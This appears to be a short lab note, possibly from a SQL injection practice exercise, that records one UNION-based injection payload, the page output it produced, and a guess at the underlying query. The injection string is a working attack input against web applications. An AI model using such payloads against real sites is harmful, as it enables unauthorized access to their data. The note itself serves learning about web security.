@@ -1,0 +1,10 @@
+After trying the following query:
+' UNION SELECT DATABASE(), null, null --
+
+The database returns:
+First name:
+Last name:
+
+This implies that the SQL query is something like:
+SELECT first_name, last_name FROM users WHERE something = '$input';
+
